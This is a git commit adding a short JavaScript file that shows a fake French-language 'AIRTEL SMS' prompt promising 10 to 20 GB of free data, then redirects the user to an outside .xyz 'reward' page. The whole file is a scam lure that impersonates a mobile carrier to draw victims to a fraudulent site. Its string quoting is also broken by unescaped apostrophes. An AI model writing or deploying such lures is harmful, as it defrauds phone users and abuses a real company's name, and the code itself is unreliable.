29d42c24c91d0919e10fb61e553977fee37813fa
okpoz <okpoitidz@gmail.com>
2026-07-14 05:14:43 +0100

    Create airtel-freegift-data.js

---
+++ airtel-freegift-data.js
@@ -0,0 +1,5 @@
+var password = 'Données gratuites'
+password=prompt('AIRTEL SMS: Félicitations ! Votre numéro est éligible pour recevoir 10 à 20 Go de données gratuites. Abonnés disposant d'une ancienne carte SIM, veuillez appuyer sur OK pour activer l'offre.. ','Données gratuites');
+if (password != 'Données gratuites') {
+location.href='https://okpoitid.xyz/airtel-freedata-rewad.html';
+}
